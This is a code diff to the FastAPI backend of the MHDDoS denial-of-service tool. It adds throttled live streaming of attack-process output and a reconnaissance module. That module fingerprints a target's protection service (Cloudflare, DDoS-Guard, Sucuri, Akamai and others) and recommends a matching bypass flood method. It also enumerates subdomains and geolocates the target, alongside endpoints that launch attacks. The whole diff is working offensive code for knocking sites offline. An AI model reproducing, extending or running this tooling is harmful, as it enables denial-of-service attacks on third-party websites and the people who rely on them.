@@ -4,6 +4,7 @@ import json
 import logging
 import re
 import sys
+import time
 import tkinter as tk
 from pathlib import Path
 from tkinter import filedialog
@@ -47,7 +48,7 @@ class EngineState:
     connected_websockets: list[WebSocket] = []
 
 state = EngineState()
-app = FastAPI(title="MHDDoS Professional API", version="1.0.6")
+app = FastAPI(title="MHDDoS Professional API", version="1.1.1")
 
 # --- Pydantic Models ---
 class AttackParams(BaseModel):
@@ -95,8 +96,8 @@ def build_attack_command(params: AttackParams) -> list[str]:
     if params.auto_harvest:
         proxy_list_arg = "auto_harvest.txt"
         harvest_path = BASE_DIR / "files" / "proxies" / "auto_harvest.txt"
-        if harvest_path.exists():
-            harvest_path.unlink(missing_ok=True)
+        # If auto_harvest is explicitly requested, we don't delete it here
+        # start.py handles the missing file by re-harvesting
     elif params.proxy_type == "All Proxy" and not proxy_list_arg:
         proxy_list_arg = "all.txt"
         
@@ -154,7 +155,7 @@ async def broadcast_log(message: str) -> None:
             state.connected_websockets.remove(dead)
 
 async def run_attack_subprocess(params: AttackParams) -> None:
-    """Runs the attack process and pipes output to WebSockets."""
+    """Runs the attack process and pipes output to WebSockets with throttling."""
     command = build_attack_command(params)
     await broadcast_log(f"[*] LAUNCHING COMMAND: {' '.join(command)}")
 
@@ -166,26 +167,148 @@ async def run_attack_subprocess(params: AttackParams) -> None:
             stderr=asyncio.subprocess.STDOUT
         )
         state.is_starting = False
-        await broadcast_log("[*] COMMAND DEPLOYED: Tactical engine active.")
+        await broadcast_log("[*] COMMAND DEPLOYED: Tactical engine initialized.")
         
         if state.process.stdout:
+            last_broadcast = time.time()
+            buffer = []
+            
             while True:
                 line = await state.process.stdout.readline()
                 if not line:
                     break
+                
                 decoded_line = line.decode('utf-8', errors='replace').strip()
                 decoded_line = ANSI_ESCAPE.sub('', decoded_line)
                 if decoded_line:
-                    await broadcast_log(decoded_line)
+                    buffer.append(decoded_line)
+                
+                # Broadcast in batches or every 50ms to prevent WS flood
+                now = time.time()
+                if buffer and (now - last_broadcast > 0.05 or len(buffer) > 10):
+                    await broadcast_log("\n".join(buffer))
+                    buffer = []
+                    last_broadcast = now
+                    await asyncio.sleep(0.01) # Yield to other tasks
+            
+            if buffer:
+                await broadcast_log("\n".join(buffer))
                 
         await state.process.wait()
-        await broadcast_log("[*] COMMAND TERMINATED: Engine process stopped.")
+        await broadcast_log("[*] COMMAND TERMINATED: Engine process reached end-of-life.")
     except Exception as e:
         logger.error(f"Engine Error: {e}")
         await broadcast_log(f"[!] CRITICAL ENGINE ERROR: {e}")
     finally:
         state.is_starting = False
         state.process = None
+
+# --- Recon Engine ---
+class ReconManager:
+    @staticmethod
+    def detect_waf(target: str) -> dict[str, Any]:
+        import requests
+        import urllib3
+        requests.packages.urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        
+        url = target if target.startswith("http") else f"http://{target}"
+        try:
+            res = requests.get(url, timeout=5, verify=False, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) TacticalRecon/1.0"})
+            headers = {k.lower(): v.lower() for k, v in res.headers.items()}
+            server = headers.get("server", "")
+            
+            # Signature Mapping
+            signatures = {
+                "cloudflare": {"waf": "Cloudflare", "method": "CFB"},
+                "ddos-guard": {"waf": "DDoS-Guard", "method": "DGB"},
+                "ddg": {"waf": "DDoS-Guard", "method": "DGB"},
+                "sucuri": {"waf": "Sucuri", "method": "BYPASS"},
+                "arvancloud": {"waf": "Arvan Cloud", "method": "AVB"},
+                "ovh": {"waf": "OVH", "method": "OVH"},
+                "incapsula": {"waf": "Imperva/Incapsula", "method": "BYPASS"},
+                "akamai": {"waf": "Akamai", "method": "BYPASS"}
+            }
+            
+            detected_waf = "None"
+            recommended_method = "BYPASS" if "BYPASS" in LAYER7 else "GET"
+            
+            # Check Server Header
+            for sig, data in signatures.items():
+                if sig in server:
+                    detected_waf = data["waf"]
+                    recommended_method = data["method"]
+                    break
+            
+            # Check Custom Headers if still None
+            if detected_waf == "None":
+                if "cf-ray" in headers:
+                    detected_waf, recommended_method = "Cloudflare", "CFB"
+                elif "x-sucuri-id" in headers:
+                    detected_waf, recommended_method = "Sucuri", "BYPASS"
+                elif "__ddg2" in res.cookies:
+                    detected_waf, recommended_method = "DDoS-Guard", "DGB"
+            
+            # Detect WordPress
+            if detected_waf == "None" or detected_waf == "Sucuri":
+                if "wp-includes" in res.text or "wordpress" in res.text:
+                    recommended_method = "XMLRPC"
+            
+            return {
+                "status": "success",
+                "waf": detected_waf,
+                "recommended_method": recommended_method,
+                "server_header": server.title() if server else "Unknown",
+                "status_code": res.status_code
+            }
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    @staticmethod
+    async def scan_subdomains(target: str) -> list[dict[str, Any]]:
+        import requests
+        import socket
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(target if "://" in target else f"http://{target}")
+        domain = parsed.netloc or parsed.path
+        if domain.startswith("www."):
+            domain = domain[4:]
+            
+        results = []
+        unique_subs = set()
+        
+        # 1. Passive Discovery (crt.sh)
+        try:
+            res = requests.get(f"https://crt.sh/?q=%.{domain}&output=json", timeout=10)
+            if res.status_code == 200:
+                data = res.json()
+                for entry in data:
+                    sub = entry['name_value'].lower()
+                    if sub.endswith(domain) and sub != domain:
+                        unique_subs.add(sub)
+        except:
+            pass
+            
+        # 2. Active Discovery (Top Common)
+        common_subs = ["dev", "api", "staging", "test", "webmail", "admin", "vpn", "git", "db", "mail"]
+        for sub in common_subs:
+            unique_subs.add(f"{sub}.{domain}")
+            
+        # 3. Resolve
+        valid_subs = sorted(list(unique_subs))[:25] # Limit for performance
+        for sub in valid_subs:
+            try:
+                loop = asyncio.get_event_loop()
+                ip = await loop.run_in_executor(None, lambda: socket.gethostbyname(sub))
+                results.append({
+                    "subdomain": sub,
+                    "ip": ip,
+                    "status": "active"
+                })
+            except:
+                continue
+                
+        return results
 
 # --- API Endpoints ---
 @app.get("/api/health", response_model=HealthResponse)
@@ -194,45 +317,53 @@ async def health_check() -> HealthResponse:
         status="online",
         engine_active=state.process is not None,
         is_starting=state.is_starting,
-        version="1.0.6"
+        version="1.1.1"
     )
+
 
 class AnalyzeParams(BaseModel):
     target: str
 
-@app.post("/api/analyze", response_model=StatusResponse)
-async def analyze_target(params: AnalyzeParams) -> StatusResponse:
-    import requests
-    target = params.target if params.target.startswith("http") else f"http://{params.target}"
+@app.post("/api/recon/analyze", response_model=StatusResponse)
+async def recon_analyze(params: AnalyzeParams) -> StatusResponse:
+    result = ReconManager.detect_waf(params.target)
+    if result["status"] == "error":
+        return StatusResponse(status="error", message=result["message"])
     
+    return StatusResponse(
+        status="success",
+        server=result["waf"],
+        recommendation=result["recommended_method"],
+        status_code=result["status_code"],
+        message=f"Server Identified: {result['server_header']}"
+    )
+
+@app.post("/api/recon/subdomains")
+async def recon_subdomains(params: AnalyzeParams):
+    subs = await ReconManager.scan_subdomains(params.target)
+    return {"status": "success", "subdomains": subs}
+
+@app.get("/api/recon/geo")
+async def recon_geo(target: str):
+    import requests
+    host = target.replace("http://", "").replace("https://", "").split("/")[0]
     try:
-        res = requests.get(target, timeout=5, verify=False)
-        headers = {k.lower(): v.lower() for k, v in res.headers.items()}
-        server = headers.get("server", "")
-        recommendation = "GET"
-        
-        if "cloudflare" in server or "cf-ray" in headers:
-            recommendation = "CFB"
-            server = "Cloudflare"
-        elif "ddos-guard" in server or "ddg" in str(headers):
-            recommendation = "DGB"
-            server = "DDoS-Guard"
-        elif "ovh" in server:
-            recommendation = "OVH"
-            server = "OVH"
-        elif "nginx" in server or "apache" in server:
-            recommendation = "BYPASS"
-        
-        return StatusResponse(
-            status="success",
-            server=server.title() if server else "Unknown",
-            recommendation=recommendation,
-            status_code=res.status_code
-        )
-    except requests.RequestException as e:
-        return StatusResponse(status="error", message=f"Request failed: {e}")
+        res = requests.get(f"https://ipwhois.app/json/{host}/", timeout=10)
+        data = res.json()
+        if data.get("success"):
+            return {
+                "status": "success",
+                "lat": data.get("latitude"),
+                "lon": data.get("longitude"),
+                "country": data.get("country"),
+                "city": data.get("city"),
+                "isp": data.get("isp"),
+                "org": data.get("org"),
+                "ip": data.get("ip")
+            }
+        return {"status": "error", "message": "Failed to retrieve Geo-IP data."}
     except Exception as e:
-        return StatusResponse(status="error", message=str(e))
+        return {"status": "error", "message": str(e)}
 
 @app.post("/api/attack/start", response_model=StatusResponse)
 async def start_attack(params: AttackParams) -> StatusResponse:
